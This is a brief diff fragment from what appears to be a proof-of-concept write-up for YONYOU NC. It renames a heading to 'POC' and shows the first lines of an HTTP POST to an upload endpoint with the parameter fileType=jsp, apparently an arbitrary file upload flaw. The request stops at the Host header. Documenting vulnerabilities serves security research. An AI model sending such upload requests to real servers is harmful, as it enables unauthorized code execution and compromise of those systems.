@@ -7,7 +7,7 @@ title="YONYOU NC"
 ```
 
 
-## poc
+## POC
 ```
 POST /uapim/upload/grouptemplet?groupid=nc&fileType=jsp&maxSize=999 HTTP/1.1
 Host: 
